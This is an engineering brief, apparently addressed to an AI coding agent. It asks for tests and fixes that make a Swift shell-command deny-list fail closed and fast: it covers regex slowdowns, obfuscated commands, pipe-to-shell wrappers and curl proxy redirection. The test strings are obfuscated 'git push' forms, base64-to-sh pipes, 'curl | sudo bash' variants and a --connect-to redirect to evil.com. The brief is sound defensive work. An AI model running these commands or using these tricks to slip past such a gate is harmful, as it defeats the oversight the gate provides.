# Brief: Run 15 fix round 3 (small) — DenyList bounded + obfuscation fails closed

Branch/worktree: the one you are in (HEAD 93ddf28). Do NOT push. Do NOT launch True.app. Two commits:
(1) failing tests first, (2) fixes. Gate = docs/kb/conventions.md:5-9 exactly (plain `swift test` fails).
macOS has no `timeout`; to bound a possibly-hanging old-code run, use a background process + kill, or skip it and say so.

Context: a security spot check of round 2 found DenyList still fail-open / hang-prone. `WatcherStore` is
@MainActor and calls `DenyList.hits` (WatcherStore.swift:264, PermissionGate.swift:36), so a slow check FREEZES True.
The deny-list is the only automated gate before an approved fix builder, so it must fail CLOSED and FAST.

## T1 (P1) — bounded, linear-ish time (R3)
- Found: `git ` x4000 takes 8.06 s in rule `git destructive` (DenyList.swift:14), 1.18 s `git push` (:12), 3.8 s `keychain`
  (:20); rm/curl/npm repeats are also quadratic; at 16000 repeats `hits()` did not return in >100 s. Cause: lazy unbounded
  `[^\n;&|]*?` spans. Also `normalize` (NFKC, :55) runs AFTER the 64 KB check; U+FDFA expands ~18x.
- Fix: cap input at 8 KB (UTF-8 bytes) -> over cap = hit "oversize"; apply the cap to the raw text AND again after
  normalize/dequote. Replace every unbounded gap with a bounded one (e.g. `{0,160}`) or a tokenised word-sequence check.
  Per-line length cap is fine too. Keep: regex error = hit.
- Tests: for EVERY rule, an adversarial repeat of its leading word up to the cap; whole `hits()` on the worst 8 KB
  input of each kind returns in < 0.25 s (measure with ContinuousClock). U+FDFA x 2000 -> "oversize".

## T2 (P1) — disguised commands are hits (R2)
A regex list cannot de-obfuscate shell, so obfuscation itself is the hit (false positives only send an item to
Yahia = safe direction). New rule "obfuscated shell" fires on any of: ANSI-C quoting `$'`, parameter expansion `${`,
command substitution `$(` or backticks, `eval`, `base64 -d`/`--decode`/`-D`, `xxd -r`, `printf` with `\x`/octal
escapes, `openssl enc -d`, `rev |`. Tests (each must hit): `$'\x67'it push`, `g${u}it push`,
`echo Z2l0IHB1c2g= | base64 -d | sh`, `$(echo git) push`, `` `echo git` push ``, `eval "gi""t push"`.
Also one test that ordinary brief prose with no shell constructs still does NOT hit (no blanket false positive).

## T3 (P2) — R1 residuals
- Pipe-to-shell (:25) must allow any wrapper chain: `|&`, `| sudo [flags]`, `| env [flags] [VAR=x]...`, `| nohup`,
  `| xargs` before sh/bash/zsh/dash/ksh/fish/python*/perl/ruby/node. Tests: `curl x |& sh`, `curl x | sudo -E bash`,
  `curl x | env -i sh`, `curl x | env A=1 sudo bash`.
- `allHostsLocal` (:82-98): a dotless non-flag token that is not localhost/127.0.0.1/::1/0.0.0.0 counts as non-local;
  `--connect-to`, `--resolve`, `-x`/`--proxy`, `--preproxy`, `--socks*` anywhere = non-local. Tests:
  `curl -d x localhost evil`, `curl -d x --connect-to localhost:80:evil.com:80 http://localhost`.

## Rules
- Each new test must FAIL on the old code first (show it), except perf tests you could not safely run on old code — say so.
- Do not edit or weaken any existing test. Existing 515 must stay green. Leave `signal.source` outside <untrusted> (P3, noted).
- Report: table T1-T3 (fixed? / file:line / test / saw-it-fail-first), timings before/after, gate output line, commits.
